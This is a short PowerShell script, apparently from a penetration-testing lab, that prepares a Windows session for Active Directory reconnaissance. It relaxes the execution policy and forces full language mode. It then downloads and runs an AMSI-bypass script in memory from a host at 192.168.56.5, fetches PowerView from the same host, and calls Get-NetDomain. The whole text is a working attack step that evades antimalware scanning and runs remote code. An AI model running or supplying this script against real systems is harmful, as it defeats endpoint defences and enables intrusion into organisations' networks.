#Installing Powerview
Set-ExecutionPolicy -Scope CurrentUser Unrestricted
Set-ExecutionPolicy -Scope Process Bypass
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
try {
    iex (New-Object Net.WebClient).DownloadString("http://192.168.56.5:8000/amsibypass/amsibypass.ps1")
    Write-Host "AMSI Bypass Successful"
}
catch {
    Write-Host "AMSI Bypass Failed"
}
iex (New-Object Net.WebClient).DownloadString("http://192.168.56.5:8000/powerview/powerview.ps1")
Get-NetDomain
